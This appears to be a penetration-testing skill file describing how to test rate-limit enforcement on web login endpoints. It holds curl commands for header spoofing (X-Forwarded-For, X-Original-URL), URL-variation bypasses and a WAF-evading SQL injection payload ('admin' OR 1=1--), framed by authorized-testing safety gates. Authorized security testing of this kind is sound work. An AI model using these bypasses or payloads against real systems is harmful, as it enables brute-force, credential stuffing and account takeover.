---
name: attack-rate-limit-bypass
description: "Assess rate-limit enforcement using low-volume tests, controlled identities, and bounded request variants"
category: "web-application"
version: "1.1.0"
author: "cyberstrike-official"
tags:
  - rate-limit
  - brute-force
  - web
  - bypass
  - attack
tech_stack:
  - web
cwe_ids:
  - CWE-307
  - CWE-770
chains_with:
  - attack-race-condition
prerequisites: []
severity_boost:
  attack-race-condition: "Rate limit bypass + race condition = unlimited exploitation"
---

# Rate Limit Bypass

## Objective

Bypass rate limiting mechanisms to enable brute-force attacks, credential stuffing, or abuse of rate-limited functionality.

## Testing Methodology

### Phase 1: Automated Bypass Testing

```bash
# Use only an account you control and the program-approved test endpoint; start with three requests
attack_script rate_limit_bypass "https://TARGET/api/test-login" \
  --method POST \
  -H "Content-Type:application/json" \
  -d '{"email":"YOUR_TEST_ACCOUNT@example.invalid","password":"INVALID_TEST_VALUE"}' \
  --count 3 \
  --json-output
```

Tests automatically:
1. X-Forwarded-For IP rotation
2. URL case variation
3. HTTP method switching
4. Random query parameter injection
5. Header-based bypasses

### Phase 2: Forwarded-IP Header Trust Check

```bash
# Only if header-spoofing tests are allowed; use a test account and a few fixed marker values
for IP in 192.0.2.10 192.0.2.11 192.0.2.12; do
  curl --max-time 15 --connect-timeout 5 -s -o /dev/null -w "%{http_code}\\n" \
    -X POST https://TARGET/api/test-login \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: $IP" \
    -d '{"email":"YOUR_TEST_ACCOUNT@example.invalid","password":"INVALID_TEST_VALUE"}'
  sleep 2
done
```

### Phase 3: URL Manipulation

```bash
# Path case variation
curl --max-time 15 --connect-timeout 5 https://TARGET/API/LOGIN
curl --max-time 15 --connect-timeout 5 https://TARGET/Api/Login

# Trailing slash/dot
curl --max-time 15 --connect-timeout 5 https://TARGET/api/login/
curl --max-time 15 --connect-timeout 5 https://TARGET/api/login/.

# Double slash
curl --max-time 15 --connect-timeout 5 https://TARGET//api//login

# Random query params (new cache key)
curl --max-time 15 --connect-timeout 5 "https://TARGET/api/login?_=$(date +%s)"
```

### Phase 4: Header Bypasses

```bash
curl --max-time 15 --connect-timeout 5 -X POST https://TARGET/api/login \
  -H "X-Forwarded-For: 127.0.0.1"

curl --max-time 15 --connect-timeout 5 -X POST https://TARGET/api/login \
  -H "X-Forwarded-Host: localhost"

curl --max-time 15 --connect-timeout 5 -X POST https://TARGET/api/login \
  -H "X-Original-URL: /api/login"

curl --max-time 15 --connect-timeout 5 -X POST https://TARGET/api/login \
  -H "X-Custom-IP-Authorization: 127.0.0.1"
```

### Phase 5: Account Lockout Bypass

```bash
# Use separate test accounts only if the program explicitly permits account-lockout testing. Do not spray passwords across users.
curl --max-time 15 --connect-timeout 5 -s -o /dev/null -w "%{http_code}\\n" \
  -X POST https://TARGET/api/test-login \
  -H "Content-Type: application/json" \
  -d '{"email":"YOUR_TEST_ACCOUNT@example.invalid","password":"INVALID_TEST_VALUE"}'

# Compare the observed response with the documented limit; do not attempt distributed credential stuffing.
```

### Phase 6: WAF Bypass + Rate Limit

```bash
# Encode payloads to avoid WAF detection
attack_script waf_bypass "admin' OR 1=1--" --test-url "https://TARGET/api/login" --param password
```

## What Constitutes a Finding

| Finding | Severity |
|---------|----------|
| Rate limit bypass on login/auth endpoint | High (P2) |
| Rate limit bypass on password reset | High (P2) |
| OTP/2FA rate limit bypass with account takeover demonstrated on a test account | Severity depends on reachable impact, other controls, and program policy |
| Financial-operation limit bypass with a duplicate or unauthorized test transaction demonstrated | Severity depends on actual financial impact and program policy |
| Rate limit bypass on non-sensitive endpoint | Low (P4) |

## Evidence Requirements

- Endpoint tested
- Normal rate limit behavior (429 after N requests)
- Bypass technique used
- Successful requests beyond the limit
- Count of requests that bypassed the limit

## Tools

- `attack_script rate_limit_bypass` — automated 5-technique bypass testing
- `attack_script waf_bypass` — encoding variants for WAF bypass

## Verification and Safe-Testing Gate

- Confirm the program explicitly permits rate-limit testing. Use a test account and a low request count; do not run distributed brute force, credential stuffing, or high-volume denial-of-service tests.
- Establish the baseline threshold and reset window before varying one factor such as endpoint, account, token, or client IP. Do not spoof network identity or rotate proxies unless explicitly authorized.
- Verify the limit is actually bypassed by observing a protected action succeeding beyond the documented/expected threshold, not merely a different status code or error message.
- Stop on account lockout, service degradation, CAPTCHA escalation, or unexpected alerts. Avoid triggering real emails, SMS, purchases, or password-reset messages repeatedly.
- Document the exact request sequence, count, interval, identity used, expected limit, observed behavior, and the practical security impact.
## Rate-Limit Measurement and Stop Conditions

Measure a baseline first, then increase request volume gradually within the program's published limits. Prefer a designated test endpoint or account; do not run distributed, high-volume, or denial-of-service tests.

Record the limit's scope and dimensions: per IP, account, API key, session, route, HTTP method, tenant, or time window. Observe status codes, Retry-After, rate-limit headers, reset timing, and whether counters are shared across equivalent routes.

| Comparison | Why it matters | Safe evidence |
|---|---|---|
| Same identity, same route | establishes baseline enforcement | small bounded request sequence |
| Same identity, alternate route/method | checks inconsistent policy mapping | compare equivalent operations only |
| Two controlled test identities | identifies account vs IP scope | separate test accounts and redacted headers |
| Authenticated vs anonymous | checks enforcement before/after auth | only where endpoint is explicitly in scope |

Do not rotate proxies, spoof other users, or generate load to bypass production protections. Stop when a documented threshold is reached or latency/errors rise. A missing header is not proof of a bypass; demonstrate that an otherwise enforced limit can be exceeded and describe the practical consequence.

## References

- [OWASP: Rate Limiting](https://owasp.org/www-community/controls/Rate_Limiting)
- [HackerOne: Rate Limit Bypass](https://www.hackerone.com/vulnerability-management/rate-limiting-bypass-techniques)
